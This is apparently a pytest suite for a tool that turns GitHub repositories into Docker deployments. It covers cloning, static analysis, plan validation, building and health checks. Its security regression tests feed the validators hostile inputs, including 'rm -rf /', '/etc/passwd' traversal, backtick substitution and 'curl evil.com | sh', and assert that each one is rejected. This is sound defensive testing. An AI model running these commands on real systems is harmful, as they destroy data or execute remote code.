"""
Phase 2.8 — Real-World Repository Compatibility Tests.

Tests the full Repo2Web pipeline against real GitHub repositories:
1. Clone (acquisition)
2. Static analysis (framework, language, entrypoint, port, etc.)
3. ExecutionPlan generation and validation
4. Docker build (if Docker available)
5. Runtime start (if Docker available)
6. Health check (if Docker available)

Records stage-level results and classifies failures.
"""

import asyncio
import json
import os
import shutil
import subprocess
import tempfile
import time
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

import pytest

from app.analyzer.analyzer import analyze_repository
from app.analyzer.types import ExecutionPlan
from app.analyzer.plan_validator import validate_plan

from tests.real_world.corpus import RealRepo, get_corpus


# ============================================================================
# Test Configuration
# ============================================================================

# Timeout for git clone operations (seconds)
CLONE_TIMEOUT = 120

# Timeout for Docker build operations (seconds)
BUILD_TIMEOUT = 300

# Timeout for runtime startup (seconds)
STARTUP_TIMEOUT = 60

# Timeout for health check (seconds)
HEALTH_TIMEOUT = 30

# Maximum number of repos to test in full pipeline mode (Docker)
MAX_DOCKER_TESTS = 10


# ============================================================================
# Result Tracking
# ============================================================================

@dataclass
class StageResult:
    """Result of a single pipeline stage."""
    stage: str
    success: bool
    duration_seconds: float = 0.0
    error: str = ""
    details: dict = field(default_factory=dict)


@dataclass
class RepoTestResult:
    """Complete test result for a single repository."""
    repo_url: str
    commit_sha: str = ""
    framework_detected: str = ""
    language_detected: str = ""
    package_manager_detected: str = ""
    port_detected: int = 0
    entrypoint_detected: str = ""
    compatibility_status: str = ""
    compatibility_confidence: str = ""
    validation_errors: list[str] = field(default_factory=list)
    stages: list[StageResult] = field(default_factory=list)
    # Accuracy tracking
    framework_correct: Optional[bool] = None
    language_correct: Optional[bool] = None
    port_correct: Optional[bool] = None
    package_manager_correct: Optional[bool] = None
    # Final result
    final_status: str = "PENDING"  # DEPLOYED, ANALYSIS_FAILED, etc.
    failure_stage: str = ""
    failure_category: str = ""
    notes: str = ""

    def to_dict(self) -> dict:
        """Convert to dictionary for JSON serialization."""
        return {
            "repo_url": self.repo_url,
            "commit_sha": self.commit_sha,
            "framework_detected": self.framework_detected,
            "language_detected": self.language_detected,
            "package_manager_detected": self.package_manager_detected,
            "port_detected": self.port_detected,
            "entrypoint_detected": self.entrypoint_detected,
            "compatibility_status": self.compatibility_status,
            "compatibility_confidence": self.compatibility_confidence,
            "validation_errors": self.validation_errors,
            "stages": [asdict(s) for s in self.stages],
            "framework_correct": self.framework_correct,
            "language_correct": self.language_correct,
            "port_correct": self.port_correct,
            "package_manager_correct": self.package_manager_correct,
            "final_status": self.final_status,
            "failure_stage": self.failure_stage,
            "failure_category": self.failure_category,
            "notes": self.notes,
        }


# ============================================================================
# Pipeline Execution Helpers
# ============================================================================

def clone_repository(url: str, target_dir: str, timeout: int = CLONE_TIMEOUT) -> tuple[bool, str, str]:
    """Clone a repository and return (success, commit_sha, error).

    Uses shallow clone for speed. Records the HEAD commit SHA.
    """
    try:
        result = subprocess.run(
            ["git", "clone", "--depth", "1", url, target_dir],
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        if result.returncode != 0:
            return False, "", f"Clone failed: {result.stderr.strip()}"

        # Resolve commit SHA
        sha_result = subprocess.run(
            ["git", "rev-parse", "HEAD"],
            capture_output=True,
            text=True,
            cwd=target_dir,
            timeout=10,
        )
        if sha_result.returncode != 0:
            return False, "", f"SHA resolution failed: {sha_result.stderr.strip()}"

        sha = sha_result.stdout.strip()
        return True, sha, ""

    except subprocess.TimeoutExpired:
        return False, "", f"Clone timed out after {timeout}s"
    except Exception as e:
        return False, "", f"Clone error: {str(e)}"


def run_analysis(repo_path: str, url: str, commit_sha: str) -> tuple[Optional[ExecutionPlan], str]:
    """Run the analyzer on a cloned repository."""
    try:
        owner = url.rstrip("/").split("/")[-2]
        repo = url.rstrip("/").split("/")[-1].removesuffix(".git")

        plan = analyze_repository(
            repo_path=repo_path,
            url=url,
            commit_sha=commit_sha,
            owner=owner,
            repo=repo,
        )
        return plan, ""
    except Exception as e:
        return None, f"Analysis failed: {str(e)}"


def check_docker_available() -> bool:
    """Check if Docker is available and running."""
    try:
        result = subprocess.run(
            ["docker", "info"],
            capture_output=True,
            text=True,
            timeout=10,
        )
        return result.returncode == 0
    except Exception:
        return False


def docker_build(
    repo_path: str,
    plan: ExecutionPlan,
    timeout: int = BUILD_TIMEOUT,
) -> tuple[bool, str, str]:
    """Attempt to build a Docker image from the repository.

    Returns (success, image_name, error).
    """
    image_name = f"repo2web-test-{int(time.time())}"

    # Determine base image
    if plan.application.language == "python":
        base_image = "python:3.11-slim"
    elif plan.application.language == "node":
        base_image = "node:20-slim"
    else:
        return False, "", f"Unsupported language: {plan.application.language}"

    # Generate a minimal Dockerfile
    dockerfile_content = _generate_dockerfile(plan, base_image)
    dockerfile_path = os.path.join(repo_path, "Dockerfile.repo2web")

    try:
        with open(dockerfile_path, "w") as f:
            f.write(dockerfile_content)

        result = subprocess.run(
            ["docker", "build", "-t", image_name, "-f", dockerfile_path, repo_path],
            capture_output=True,
            text=True,
            timeout=timeout,
        )

        if result.returncode != 0:
            return False, "", f"Build failed:\n{result.stderr[-2000:]}"

        return True, image_name, ""

    except subprocess.TimeoutExpired:
        return False, "", f"Build timed out after {timeout}s"
    except Exception as e:
        return False, "", f"Build error: {str(e)}"


def _generate_dockerfile(plan: ExecutionPlan, base_image: str) -> str:
    """Generate a Dockerfile for the repository based on the execution plan."""
    lines = [f"FROM {base_image}", "WORKDIR /app"]

    # Copy source code
    lines.append("COPY . .")

    # Install dependencies
    if plan.build.install_command:
        # Override for Docker context
        if plan.application.language == "python":
            if plan.build.package_manager == "pip":
                if "requirements.txt" in (plan.build.install_command or ""):
                    lines.append("RUN pip install --no-cache-dir -r requirements.txt")
                elif "pyproject.toml" in (plan.build.install_command or ""):
                    lines.append("RUN pip install --no-cache-dir .")
                else:
                    lines.append(f"RUN {plan.build.install_command}")
            elif plan.build.package_manager == "poetry":
                lines.append("RUN pip install poetry && poetry install --no-dev")
            elif plan.build.package_manager == "pipenv":
                lines.append("RUN pip install pipenv && pipenv install --system")
            else:
                lines.append(f"RUN {plan.build.install_command}")
        elif plan.application.language == "node":
            if plan.build.package_manager == "pnpm":
                lines.append("RUN npm install -g pnpm && pnpm install")
            elif plan.build.package_manager == "yarn":
                lines.append("RUN yarn install")
            else:
                lines.append("RUN npm install")

    # Build step
    if plan.build.build_command:
        lines.append(f"RUN {plan.build.build_command}")

    # Expose port
    lines.append(f"EXPOSE {plan.runtime.port}")

    # Start command - convert to shell form for Dockerfile CMD
    start_cmd = plan.runtime.start_command
    # Ensure host binding for Docker
    if "0.0.0.0" not in start_cmd:
        if "uvicorn" in start_cmd and "--host" not in start_cmd:
            start_cmd += " --host 0.0.0.0"
        elif "flask run" in start_cmd and "--host" not in start_cmd:
            start_cmd += " --host 0.0.0.0"

    lines.append(f'CMD {json.dumps(["sh", "-c", start_cmd])}')

    return "\n".join(lines)


def docker_start(
    image_name: str,
    port: int,
    timeout: int = STARTUP_TIMEOUT,
) -> tuple[bool, str, str]:
    """Start a Docker container and return (success, container_id, error)."""
    container_name = f"repo2web-test-{int(time.time())}"

    try:
        result = subprocess.run(
            [
                "docker", "run", "-d",
                "--name", container_name,
                "-p", f"{port}:{port}",
                "--cap-drop", "ALL",
                "--security-opt", "no-new-privileges:true",
                "--memory", "512m",
                "--cpus", "1",
                image_name,
            ],
            capture_output=True,
            text=True,
            timeout=30,
        )

        if result.returncode != 0:
            return False, "", f"Start failed: {result.stderr.strip()}"

        container_id = result.stdout.strip()

        # Wait for container to be running
        time.sleep(3)

        # Check if container is still running
        inspect_result = subprocess.run(
            ["docker", "inspect", "--format", "{{.State.Status}}", container_name],
            capture_output=True,
            text=True,
            timeout=10,
        )

        if "running" not in inspect_result.stdout.lower():
            # Get logs
            logs_result = subprocess.run(
                ["docker", "logs", container_name],
                capture_output=True,
                text=True,
                timeout=10,
            )
            return False, "", f"Container not running. Logs:\n{logs_result.stdout[-2000:]}\n{logs_result.stderr[-1000:]}"

        return True, container_name, ""

    except subprocess.TimeoutExpired:
        return False, "", f"Start timed out after {timeout}s"
    except Exception as e:
        return False, "", f"Start error: {str(e)}"


def docker_health_check(
    container_name: str,
    port: int,
    path: str = "/",
    timeout: int = HEALTH_TIMEOUT,
) -> tuple[bool, str]:
    """Check container health via HTTP."""
    try:
        # Use docker exec to curl from inside the container
        result = subprocess.run(
            [
                "docker", "exec", container_name,
                "sh", "-c", f"curl -sf --max-time {timeout} http://localhost:{port}{path} || wget -qO- --timeout={timeout} http://localhost:{port}{path} || exit 1",
            ],
            capture_output=True,
            text=True,
            timeout=timeout + 5,
        )

        if result.returncode == 0 and result.stdout.strip():
            return True, result.stdout.strip()[:500]
        else:
            return False, f"Health check failed: {result.stderr.strip()[:500]}"

    except subprocess.TimeoutExpired:
        return False, f"Health check timed out after {timeout}s"
    except Exception as e:
        return False, f"Health check error: {str(e)}"


def docker_cleanup(container_name: str, image_name: str = "") -> None:
    """Clean up Docker resources."""
    try:
        if container_name:
            subprocess.run(
                ["docker", "rm", "-f", container_name],
                capture_output=True,
                timeout=10,
            )
        if image_name:
            subprocess.run(
                ["docker", "rmi", "-f", image_name],
                capture_output=True,
                timeout=10,
            )
    except Exception:
        pass


# ============================================================================
# Accuracy Measurement
# ============================================================================

def measure_accuracy(
    plan: ExecutionPlan,
    expected: RealRepo,
) -> dict:
    """Measure detection accuracy against expected values."""
    results = {}

    # Framework accuracy
    if expected.framework:
        detected = plan.application.framework or ""
        results["framework"] = {
            "expected": expected.framework,
            "detected": detected,
            "correct": detected.lower() == expected.framework.lower(),
        }

    # Language accuracy
    if expected.language:
        detected = plan.application.language or ""
        results["language"] = {
            "expected": expected.language,
            "detected": detected,
            "correct": detected.lower() == expected.language.lower(),
        }

    # Port accuracy
    if expected.expected_port:
        detected = plan.runtime.port
        results["port"] = {
            "expected": expected.expected_port,
            "detected": detected,
            "correct": detected == expected.expected_port,
        }

    # Package manager accuracy
    if expected.package_manager:
        detected = plan.build.package_manager or ""
        results["package_manager"] = {
            "expected": expected.package_manager,
            "detected": detected,
            "correct": detected.lower() == expected.package_manager.lower(),
        }

    return results


# ============================================================================
# FAILURE CLASSIFICATION
# ============================================================================

def classify_failure(error: str, stage: str) -> tuple[str, str]:
    """Classify a failure into category and root cause.

    Returns (category, root_cause).
    """
    error_lower = error.lower()

    if stage == "clone":
        if "timeout" in error_lower:
            return "acquisition", "clone_timeout"
        elif "not found" in error_lower or "does not exist" in error_lower:
            return "acquisition", "repository_unavailable"
        elif "fatal" in error_lower:
            return "acquisition", "clone_failure"
        else:
            return "acquisition", "unknown_clone_error"

    elif stage == "analysis":
        if "no supported language" in error_lower:
            return "analysis", "language_not_detected"
        elif "no entrypoint" in error_lower:
            return "analysis", "entrypoint_not_detected"
        else:
            return "analysis", "analysis_error"

    elif stage == "planning":
        return "planning", "plan_generation_error"

    elif stage == "validation":
        return "validation", "plan_validation_error"

    elif stage == "build":
        if "no space left" in error_lower:
            return "build", "disk_space"
        elif "could not find" in error_lower or "not found" in error_lower:
            return "build", "dependency_installation_failure"
        elif "error" in error_lower and ("compile" in error_lower or "build" in error_lower):
            return "build", "build_failure"
        elif "timeout" in error_lower:
            return "build", "build_timeout"
        else:
            return "build", "build_error"

    elif stage == "runtime":
        if "not running" in error_lower:
            return "runtime", "process_exits"
        elif "timeout" in error_lower:
            return "runtime", "startup_timeout"
        else:
            return "runtime", "runtime_error"

    elif stage == "health_check":
        if "timed out" in error_lower:
            return "health_check", "health_timeout"
        elif "connection refused" in error_lower:
            return "health_check", "application_unavailable"
        elif "404" in error_lower:
            return "health_check", "wrong_endpoint"
        else:
            return "health_check", "health_check_error"

    return "environment", "unknown_error"


# ============================================================================
# PYTEST FIXTURES
# ============================================================================

@pytest.fixture(scope="session")
def docker_available():
    """Check if Docker is available for the entire test session."""
    return check_docker_available()


@pytest.fixture(scope="session")
def corpus():
    """Get the full real-world repository corpus."""
    return get_corpus()


@pytest.fixture(scope="module")
def temp_dir():
    """Create a temporary directory for test repos."""
    d = tempfile.mkdtemp(prefix="repo2web_test_")
    yield d
    shutil.rmtree(d, ignore_errors=True)


# ============================================================================
# TEST CLASS: ANALYSIS PIPELINE (No Docker Required)
# ============================================================================

_SHARED_RESULTS_PATH = Path(__file__).parent / "analysis_results.json"


class TestRealWorldAnalysis:
    """Test the analysis pipeline against real repositories.

    These tests only require git and the analyzer (no Docker).
    """

    @pytest.fixture(autouse=True)
    def setup(self, temp_dir):
        """Setup for each test."""
        self.temp_dir = temp_dir

    @staticmethod
    def _load_shared_results() -> list[dict]:
        """Load accumulated results from disk."""
        if _SHARED_RESULTS_PATH.exists():
            with open(_SHARED_RESULTS_PATH) as f:
                return json.load(f)
        return []

    @staticmethod
    def _save_shared_result(result: RepoTestResult) -> None:
        """Append a single result to the shared JSON file."""
        existing = TestRealWorldAnalysis._load_shared_results()
        existing.append(result.to_dict())
        with open(_SHARED_RESULTS_PATH, "w") as f:
            json.dump(existing, f, indent=2, default=str)

    @staticmethod
    def _clear_shared_results() -> None:
        """Clear the shared results file."""
        if _SHARED_RESULTS_PATH.exists():
            _SHARED_RESULTS_PATH.unlink()

    def _clone_and_analyze(self, repo: RealRepo) -> RepoTestResult:
        """Clone a repo and run analysis. Returns full test result."""
        result = RepoTestResult(repo_url=repo.url)

        # Stage 1: Clone
        clone_dir = os.path.join(self.temp_dir, f"repo_{int(time.time())}_{hash(repo.url) % 10000}")
        start = time.time()
        success, sha, error = clone_repository(repo.url, clone_dir)
        duration = time.time() - start
        result.stages.append(StageResult(
            stage="clone",
            success=success,
            duration_seconds=duration,
            error=error,
        ))

        if not success:
            result.final_status = "ACQUISITION_FAILED"
            cat, cause = classify_failure(error, "clone")
            result.failure_stage = "clone"
            result.failure_category = cause
            return result

        result.commit_sha = sha

        # Stage 2: Analysis
        start = time.time()
        plan, error = run_analysis(clone_dir, repo.url, sha)
        duration = time.time() - start
        result.stages.append(StageResult(
            stage="analysis",
            success=plan is not None,
            duration_seconds=duration,
            error=error,
        ))

        if plan is None:
            result.final_status = "ANALYSIS_FAILED"
            cat, cause = classify_failure(error, "analysis")
            result.failure_stage = "analysis"
            result.failure_category = cause
            return result

        # Record analysis results
        result.framework_detected = plan.application.framework or ""
        result.language_detected = plan.application.language or ""
        result.package_manager_detected = plan.build.package_manager or ""
        result.port_detected = plan.runtime.port
        result.entrypoint_detected = plan.runtime.start_command
        result.compatibility_status = plan.compatibility.status
        result.compatibility_confidence = plan.compatibility.confidence

        # Stage 3: Validation
        start = time.time()
        validation = validate_plan(plan)
        duration = time.time() - start
        result.stages.append(StageResult(
            stage="validation",
            success=validation.valid,
            duration_seconds=duration,
            error="; ".join(validation.errors) if validation.errors else "",
            details={"errors": validation.errors},
        ))

        result.validation_errors = validation.errors

        if not validation.valid:
            result.final_status = "VALIDATION_FAILED"
            result.failure_stage = "validation"
            result.failure_category = "plan_validation_error"
            return result

        # Measure accuracy
        accuracy = measure_accuracy(plan, repo)
        if "framework" in accuracy:
            result.framework_correct = accuracy["framework"]["correct"]
        if "language" in accuracy:
            result.language_correct = accuracy["language"]["correct"]
        if "port" in accuracy:
            result.port_correct = accuracy["port"]["correct"]
        if "package_manager" in accuracy:
            result.package_manager_correct = accuracy["package_manager"]["correct"]

        result.final_status = "ANALYSIS_SUCCESS"
        return result

    @pytest.mark.parametrize("repo_index", list(range(len(get_corpus()))))
    def test_analyze_real_repo(self, repo_index):
        """Test analysis of a single real repository."""
        corpus = get_corpus()
        repo = corpus[repo_index]

        result = self._clone_and_analyze(repo)

        # Persist result to shared JSON
        self._save_shared_result(result)

        # Assertions
        assert result.final_status in (
            "ANALYSIS_SUCCESS",
            "ACQUISITION_FAILED",
            "ANALYSIS_FAILED",
            "VALIDATION_FAILED",
        ), f"Unexpected status: {result.final_status}"

        # If analysis succeeded, verify key fields
        if result.final_status == "ANALYSIS_SUCCESS":
            assert result.language_detected, "Language should be detected"
            assert result.port_detected > 0, "Port should be detected"
            assert result.entrypoint_detected, "Entrypoint should be detected"
            assert result.compatibility_status in (
                "SUPPORTED", "SUPPORTED_WITH_WARNINGS", "UNSUPPORTED", "BLOCKED"
            )

    def test_corpus_summary(self):
        """Print summary of all analysis results from shared JSON."""
        results = self._load_shared_results()
        if not results:
            pytest.skip("No results to summarize")

        print("\n" + "=" * 100)
        print("REAL-WORLD ANALYSIS RESULTS SUMMARY")
        print("=" * 100)

        total = len(results)
        success = sum(1 for r in results if r["final_status"] == "ANALYSIS_SUCCESS")
        failed = total - success

        print(f"\nTotal repositories: {total}")
        print(f"Analysis succeeded: {success}")
        print(f"Analysis failed: {failed}")
        print(f"Success rate: {success/total*100:.1f}%")

        # Accuracy metrics
        lang_correct = sum(1 for r in results if r.get("language_correct") is True)
        lang_total = sum(1 for r in results if r.get("language_correct") is not None)
        if lang_total > 0:
            print(f"\nLanguage accuracy: {lang_correct}/{lang_total} = {lang_correct/lang_total*100:.1f}%")

        fw_correct = sum(1 for r in results if r.get("framework_correct") is True)
        fw_total = sum(1 for r in results if r.get("framework_correct") is not None)
        if fw_total > 0:
            print(f"Framework accuracy: {fw_correct}/{fw_total} = {fw_correct/fw_total*100:.1f}%")

        port_correct = sum(1 for r in results if r.get("port_correct") is True)
        port_total = sum(1 for r in results if r.get("port_correct") is not None)
        if port_total > 0:
            print(f"Port accuracy: {port_correct}/{port_total} = {port_correct/port_total*100:.1f}%")

        pm_correct = sum(1 for r in results if r.get("package_manager_correct") is True)
        pm_total = sum(1 for r in results if r.get("package_manager_correct") is not None)
        if pm_total > 0:
            print(f"Package manager accuracy: {pm_correct}/{pm_total} = {pm_correct/pm_total*100:.1f}%")

        # Failure breakdown
        if failed > 0:
            print(f"\n--- Failure Breakdown ---")
            for r in results:
                if r["final_status"] != "ANALYSIS_SUCCESS":
                    print(f"  {r['repo_url']}")
                    print(f"    Status: {r['final_status']}")
                    print(f"    Stage: {r.get('failure_stage', '')}")
                    print(f"    Category: {r.get('failure_category', '')}")

        # Detailed results
        print(f"\n--- Detailed Results ---")
        for r in results:
            icon = "\u2713" if r["final_status"] == "ANALYSIS_SUCCESS" else "\u2717"
            print(f"\n{icon} {r['repo_url']}")
            sha = r["commit_sha"][:12] + "..."
            print(f"  SHA: {sha}")
            print(f"  Language: {r['language_detected']}")
            fw = r["framework_detected"] or "(none)"
            print(f"  Framework: {fw}")
            print(f"  Port: {r['port_detected']}")
            print(f"  Package Manager: {r['package_manager_detected']}")
            ep = r["entrypoint_detected"][:80]
            print(f"  Entrypoint: {ep}")
            cs = r["compatibility_status"]
            cc = r["compatibility_confidence"]
            print(f"  Compatibility: {cs} ({cc})")
            if r["validation_errors"]:
                print(f"  Validation Errors: {r['validation_errors']}")

        print("\n" + "=" * 100)


# ============================================================================
# TEST CLASS: FULL PIPELINE (Docker Required)
# ============================================================================

class TestRealWorldPipeline:
    """Test the full deployment pipeline against real repositories.

    These tests require Docker to be available.
    """

    @pytest.fixture(autouse=True)
    def setup(self, temp_dir, docker_available):
        """Setup for each test."""
        self.temp_dir = temp_dir
        self.docker_available = docker_available
        self.results: list[RepoTestResult] = []

    def test_full_pipeline_express_hello(self, docker_available):
        """Test full pipeline with a simple Express hello world."""
        if not docker_available:
            pytest.skip("Docker not available")

        repo = RealRepo(
            url="https://github.com/coderooz/Hello-World-Web-Server",
            framework="express",
            language="node",
            package_manager="npm",
            expected_port=3000,
        )

        result = self._run_full_pipeline(repo)
        self.results.append(result)

        # The pipeline should at least get through analysis
        assert result.final_status in (
            "DEPLOYED_SUCCESSFULLY",
            "BUILD_FAILED",
            "START_FAILED",
            "HEALTH_CHECK_FAILED",
            "ACQUISITION_FAILED",
            "ANALYSIS_FAILED",
        )

    def test_full_pipeline_flask_minimal(self, docker_available):
        """Test full pipeline with a minimal Flask app."""
        if not docker_available:
            pytest.skip("Docker not available")

        repo = RealRepo(
            url="https://github.com/mfieldhouse/flask-minimal",
            framework="flask",
            language="python",
            package_manager="pip",
            expected_port=5000,
        )

        result = self._run_full_pipeline(repo)
        self.results.append(result)

        assert result.final_status in (
            "DEPLOYED_SUCCESSFULLY",
            "BUILD_FAILED",
            "START_FAILED",
            "HEALTH_CHECK_FAILED",
            "ACQUISITION_FAILED",
            "ANALYSIS_FAILED",
        )

    def test_full_pipeline_fastapi_template(self, docker_available):
        """Test full pipeline with FastAPI template."""
        if not docker_available:
            pytest.skip("Docker not available")

        repo = RealRepo(
            url="https://github.com/tiangolo/full-stack-fastapi-template",
            framework="fastapi",
            language="python",
            package_manager="pip",
            expected_port=8000,
        )

        result = self._run_full_pipeline(repo)
        self.results.append(result)

        # This one is complex - may fail at build/runtime
        assert result.final_status in (
            "DEPLOYED_SUCCESSFULLY",
            "BUILD_FAILED",
            "START_FAILED",
            "HEALTH_CHECK_FAILED",
            "ACQUISITION_FAILED",
            "ANALYSIS_FAILED",
            "VALIDATION_FAILED",
        )

    def _run_full_pipeline(self, repo: RealRepo) -> RepoTestResult:
        """Run the full deployment pipeline for a repository."""
        result = RepoTestResult(repo_url=repo.url)
        container_name = ""
        image_name = ""

        try:
            # Stage 1: Clone
            clone_dir = os.path.join(self.temp_dir, f"full_{int(time.time())}_{hash(repo.url) % 10000}")
            start = time.time()
            success, sha, error = clone_repository(repo.url, clone_dir)
            duration = time.time() - start
            result.stages.append(StageResult(
                stage="clone", success=success,
                duration_seconds=duration, error=error,
            ))
            if not success:
                result.final_status = "ACQUISITION_FAILED"
                cat, cause = classify_failure(error, "clone")
                result.failure_stage = "clone"
                result.failure_category = cause
                return result
            result.commit_sha = sha

            # Stage 2: Analysis
            start = time.time()
            plan, error = run_analysis(clone_dir, repo.url, sha)
            duration = time.time() - start
            result.stages.append(StageResult(
                stage="analysis", success=plan is not None,
                duration_seconds=duration, error=error,
            ))
            if plan is None:
                result.final_status = "ANALYSIS_FAILED"
                cat, cause = classify_failure(error, "analysis")
                result.failure_stage = "analysis"
                result.failure_category = cause
                return result

            result.framework_detected = plan.application.framework or ""
            result.language_detected = plan.application.language or ""
            result.port_detected = plan.runtime.port
            result.entrypoint_detected = plan.runtime.start_command
            result.compatibility_status = plan.compatibility.status

            # Stage 3: Validation
            validation = validate_plan(plan)
            result.stages.append(StageResult(
                stage="validation", success=validation.valid,
                error="; ".join(validation.errors),
            ))
            result.validation_errors = validation.errors

            if not validation.valid:
                result.final_status = "VALIDATION_FAILED"
                result.failure_stage = "validation"
                return result

            if plan.compatibility.status == "UNSUPPORTED":
                result.final_status = "UNSUPPORTED"
                result.notes = f"Blockers: {plan.compatibility.blockers}"
                return result

            # Stage 4: Docker Build
            start = time.time()
            success, image_name, error = docker_build(clone_dir, plan)
            duration = time.time() - start
            result.stages.append(StageResult(
                stage="build", success=success,
                duration_seconds=duration, error=error,
            ))
            if not success:
                result.final_status = "BUILD_FAILED"
                cat, cause = classify_failure(error, "build")
                result.failure_stage = "build"
                result.failure_category = cause
                return result

            # Stage 5: Runtime Start
            start = time.time()
            success, container_name, error = docker_start(image_name, plan.runtime.port)
            duration = time.time() - start
            result.stages.append(StageResult(
                stage="runtime", success=success,
                duration_seconds=duration, error=error,
            ))
            if not success:
                result.final_status = "START_FAILED"
                cat, cause = classify_failure(error, "runtime")
                result.failure_stage = "runtime"
                result.failure_category = cause
                return result

            # Stage 6: Health Check
            start = time.time()
            success, output = docker_health_check(
                container_name,
                plan.runtime.port,
                plan.runtime.health_check_path,
            )
            duration = time.time() - start
            result.stages.append(StageResult(
                stage="health_check", success=success,
                duration_seconds=duration, error="" if success else output,
                details={"response": output[:500] if success else ""},
            ))
            if not success:
                result.final_status = "HEALTH_CHECK_FAILED"
                cat, cause = classify_failure(output, "health_check")
                result.failure_stage = "health_check"
                result.failure_category = cause
                return result

            # Success!
            result.final_status = "DEPLOYED_SUCCESSFULLY"
            return result

        finally:
            # Cleanup
            docker_cleanup(container_name, image_name)

    def test_pipeline_summary(self):
        """Print summary of all pipeline results."""
        if not self.results:
            pytest.skip("No pipeline results to summarize")

        print("\n" + "=" * 80)
        print("FULL PIPELINE RESULTS SUMMARY")
        print("=" * 80)

        total = len(self.results)
        success = sum(1 for r in self.results if r.final_status == "DEPLOYED_SUCCESSFULLY")
        print(f"\nTotal attempted: {total}")
        print(f"Deployed successfully: {success}")
        print(f"Success rate: {success/total*100:.1f}%")

        # Stage-level breakdown
        stages = ["clone", "analysis", "validation", "build", "runtime", "health_check"]
        for stage in stages:
            stage_results = [r for r in self.results if any(s.stage == stage for s in r.stages)]
            stage_success = sum(
                1 for r in self.results
                for s in r.stages
                if s.stage == stage and s.success
            )
            if stage_results:
                print(f"  {stage}: {stage_success}/{len(stage_results)} passed")

        # Failure taxonomy
        print(f"\n--- Failure Taxonomy ---")
        for r in self.results:
            if r.final_status != "DEPLOYED_SUCCESSFULLY":
                print(f"  [{r.failure_category}] {r.repo_url} -> {r.final_status}")

        print("\n" + "=" * 80)

        # Save results
        results_path = Path(__file__).parent / "pipeline_results.json"
        with open(results_path, "w") as f:
            json.dump(
                [r.to_dict() for r in self.results],
                f,
                indent=2,
                default=str,
            )
        print(f"\nResults saved to: {results_path}")


# ============================================================================
# TEST CLASS: SECURITY REGRESSION (Phase 2.7)
# ============================================================================

class TestSecurityRegression:
    """Verify Phase 2.7 security controls remain intact after Phase 2.8 changes."""

    def test_url_validation_intact(self):
        """Verify URL validation still works correctly."""
        from app.security.validation import validate_github_url

        # Valid URLs
        valid, _ = validate_github_url("https://github.com/owner/repo")
        assert valid is True

        valid, _ = validate_github_url("https://github.com/tiangolo/fastapi")
        assert valid is True

        # Invalid URLs
        valid, reason = validate_github_url("http://evil.com/malware")
        assert valid is False

        valid, reason = validate_github_url("https://github.com/owner/repo/../../../etc/passwd")
        assert valid is False

        valid, reason = validate_github_url("https://github.com/owner/repo;rm -rf /")
        assert valid is False

        valid, reason = validate_github_url("")
        assert valid is False

    def test_command_validation_intact(self):
        """Verify build/runtime command validation still works."""
        from app.security.validation import sanitize_shell_argument

        # Safe arguments
        assert sanitize_shell_argument("pip install -r requirements.txt") == "pip install -r requirements.txt"
        assert sanitize_shell_argument("npm install") == "npm install"

        # Unsafe arguments
        with pytest.raises(ValueError):
            sanitize_shell_argument("pip install; rm -rf /")

        with pytest.raises(ValueError):
            sanitize_shell_argument("npm install && curl evil.com | sh")

        with pytest.raises(ValueError):
            sanitize_shell_argument("echo `whoami`")

    def test_plan_validator_intact(self):
        """Verify plan validation still catches invalid plans."""
        from app.analyzer.types import (
            ApplicationInfo, BuildInfo, CompatibilityResult,
            RepositoryInfo, RuntimeInfo, ExecutionPlan,
        )

        # Invalid plan (bad port)
        plan = ExecutionPlan(
            repository=RepositoryInfo(
                url="https://github.com/test/repo",
                commit_sha="abc123def456",
                owner="test", repo="repo",
            ),
            application=ApplicationInfo(
                language="python", framework="fastapi",
                framework_version=None, confidence="HIGH",
            ),
            build=BuildInfo(
                package_manager="pip",
                install_command="pip install -r requirements.txt",
                build_command=None, working_directory=".",
            ),
            runtime=RuntimeInfo(
                start_command="uvicorn main:app --host 0.0.0.0 --port 8000",
                port=99999, host="0.0.0.0", health_check_path="/health",
            ),
            compatibility=CompatibilityResult(
                status="SUPPORTED", confidence="HIGH",
            ),
        )

        result = validate_plan(plan)
        assert result.valid is False
        assert any("Port" in e for e in result.errors)

    def test_analyzer_no_code_execution(self):
        """Verify analyzer never executes repository code."""
        import unittest.mock as mock

        with mock.patch("subprocess.run") as mock_run:
            with mock.patch("os.system") as mock_system:
                # Use one of the existing fixture repos
                fixture_path = str(Path(__file__).parent.parent / "fixtures" / "repos" / "python-fastapi")
                plan = analyze_repository(
                    repo_path=fixture_path,
                    url="https://github.com/test/fastapi-app",
                    commit_sha="abc123def456",
                    owner="test",
                    repo="fastapi-app",
                )
                mock_run.assert_not_called()
                mock_system.assert_not_called()

    def test_frozen_dataclasses_intact(self):
        """Verify all analyzer types are frozen dataclasses."""
        from app.analyzer.types import (
            DetectedSignal, EnvironmentVariable, ServiceDependency,
            CompatibilityResult, RepositoryInfo, ApplicationInfo,
            BuildInfo, RuntimeInfo, FileInventory, ExecutionPlan,
        )

        # Try to modify each type - should raise AttributeError
        types_to_test = [
            DetectedSignal(field="test", value="test", confidence="HIGH"),
            EnvironmentVariable(name="TEST", required=False, secret=False, source="test"),
            ServiceDependency(name="test", required=False),
            CompatibilityResult(status="SUPPORTED", confidence="HIGH"),
            RepositoryInfo(url="test", commit_sha="test", owner="test", repo="test"),
            ApplicationInfo(language="python", framework=None, framework_version=None, confidence="HIGH"),
            BuildInfo(package_manager="pip", install_command=None, build_command=None, working_directory="."),
            RuntimeInfo(start_command="test", port=3000, host="0.0.0.0", health_check_path="/"),
        ]

        for obj in types_to_test:
            with pytest.raises(AttributeError):
                # Try to set any attribute
                for attr in obj.__dataclass_fields__:
                    setattr(obj, attr, "modified")
                    break  # Should not reach here
